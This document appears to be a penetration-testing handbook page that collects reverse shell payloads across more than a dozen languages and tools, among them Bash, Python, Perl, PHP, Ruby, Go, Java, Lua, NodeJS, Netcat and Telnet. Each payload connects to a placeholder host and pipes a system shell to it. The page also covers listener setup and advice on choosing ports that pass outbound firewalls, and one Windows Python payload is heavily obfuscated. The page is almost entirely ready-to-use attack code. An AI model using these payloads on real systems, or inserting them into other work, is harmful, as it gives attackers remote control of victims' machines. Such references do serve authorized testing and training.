# Reverse Shells

## Listener

```sh
nc -nvlp 4444
```

Parameters

- `n`: don’t do DNS lookups.
- `v`: prints status messages.
- `l`: listen.
- `p <port>`: local port used for listening.


```bash
pipx install git+https://github.com/brightio/penelope

penelope --oscp-safe

penelope                          # Listening for reverse shells on 0.0.0.0:4444
penelope -p 5555                  # Listening for reverse shells on 0.0.0.0:5555
penelope -p 4444,5555             # Listening for reverse shells on 0.0.0.0:4444 and 0.0.0.0:5555
penelope -i eth0 -p 5555          # Listening for reverse shells on eth0:5555
```


**Note:**
Use a port that is likely allowed via outbound firewall rules on the target network.
Ports from 1 to 1023 are by default privileged ports. To bind to a privileged port, a process must be running with root permissions.


### Bash [#](https://0xffsec.com/handbook/shells/reverse-shells/#bash)

```sh
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

```sh
0<&196;exec 196<>/dev/tcp/10.0.0.1/1234; sh <&196 >&196 2>&196
```

### Awk [#](https://0xffsec.com/handbook/shells/reverse-shells/#awk)

```sh
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Gawk [#](https://0xffsec.com/handbook/shells/reverse-shells/#gawk)

```gawk
#!/usr/bin/gawk -f

BEGIN {
    Service = "/inet/tcp/0/10.0.0.1/1234"
    while (1) {
        do {
            printf "0xffsec>" |& Service
            Service |& getline cmd
            if (cmd) {
                while ((cmd |& getline) > 0)
                    print $0 |& Service
            close(cmd)
            }
        } while (cmd != "exit")
        close(Service)
    }
}
```

### PERL [#](https://0xffsec.com/handbook/shells/reverse-shells/#perl)

```sh
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PERL Windows [#](https://0xffsec.com/handbook/shells/reverse-shells/#perl-windows)

```sh
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Python [#](https://0xffsec.com/handbook/shells/reverse-shells/#python)

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python Windows [#](https://0xffsec.com/handbook/shells/reverse-shells/#python-windows)

```sh
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### PHP [#](https://0xffsec.com/handbook/shells/reverse-shells/#php)

```sh
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```sh
php -r '$sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Ruby [#](https://0xffsec.com/handbook/shells/reverse-shells/#ruby)

```sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```sh
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Ruby Windows [#](https://0xffsec.com/handbook/shells/reverse-shells/#ruby-windows)

```sh
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Golang [#](https://0xffsec.com/handbook/shells/reverse-shells/#golang)

```sh
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:1234");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Java [#](https://0xffsec.com/handbook/shells/reverse-shells/#java)

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Groovy [3](https://0xffsec.com/handbook/shells/reverse-shells/#fn:3) [#](https://0xffsec.com/handbook/shells/reverse-shells/#groovy-groovy-shell)

```groovy
String host="10.0.0.1";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

**Note:** Java reverse shell also works for Groovy.

### Lua [#](https://0xffsec.com/handbook/shells/reverse-shells/#lua)

```sh
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### Lua Windows [#](https://0xffsec.com/handbook/shells/reverse-shells/#lua-windows)

```sh
lua5.1 -e 'local host, port = "10.0.0.1", 1234 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### NodeJS [#](https://0xffsec.com/handbook/shells/reverse-shells/#nodejs)

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

```js
require('child_process').exec('nc -e /bin/sh 10.0.0.1 1234')
```

```js
-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 1234 -e /bin/bash')
```

### Netcat [#](https://0xffsec.com/handbook/shells/reverse-shells/#netcat)

```sh
nc -e /bin/sh 10.0.0.1 1234
```

Depending on the Netcat version, the `-e` option may not be available, but you still can execute a command after connection being established by redirecting file descriptors. A FIFO or named pipe can be created locally so when a connection is established, `/bin/sh` gets executed and the shell prompt is given to the remote machine.[4](https://0xffsec.com/handbook/shells/reverse-shells/#fn:4)

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Netcat Windows [#](https://0xffsec.com/handbook/shells/reverse-shells/#netcat-windows)

```sh
nc.exe 10.0.0.1 1234 -e cmd.exe
```

### Telnet [#](https://0xffsec.com/handbook/shells/reverse-shells/#telnet)

```sh
rm -f /tmp/f; mknod /tmp/f p && telnet 10.0.0.1 1234 0/tmp/p
```

**Note:** A FIFO can be create both with `mknod <path> p` or `mkfifo <path>` .

